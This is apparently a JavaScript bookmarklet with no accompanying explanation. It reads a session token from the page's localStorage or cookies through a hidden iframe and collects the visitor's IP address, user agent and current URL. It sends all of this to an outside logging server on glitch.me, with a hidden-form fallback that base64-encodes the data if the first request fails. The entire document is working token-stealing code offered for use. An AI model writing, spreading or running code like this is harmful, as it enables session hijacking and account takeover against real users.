javascript:(function(){

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    const token = iframe.contentWindow.localStorage.getItem('token') || 
                 iframe.contentDocument.cookie.match(/token=([^;]+)/)?.[1];
    
    if (!token) {
        document.body.removeChild(iframe);
        return;
    }

    const SERVER_URL = 'https://serious-mysterious-albertonykus.glitch.me';

    function sendData(data) {

        fetch(`${SERVER_URL}/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {

            const form = document.createElement('form');
            form.action = `${SERVER_URL}/log`;
            form.method = 'POST';
            form.target = '_blank';
            
            const input = document.createElement('input');
            input.name = 'data';
            input.value = btoa(JSON.stringify(data));
            form.appendChild(input);
            
            document.body.appendChild(form);
            form.submit();
        });
    }

    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(ipData => {
            sendData({
                token: token.slice(0, 50),
                ip: ipData.ip,
                ua: navigator.userAgent,
                url: window.location.href
            });
        })
        .catch(() => {
            sendData({
                token: token.slice(0, 50),
                ip: 'Unknown',
                ua: navigator.userAgent,
                url: window.location.href
            });
        })
        .finally(() => {
            document.body.removeChild(iframe);
        });
})();
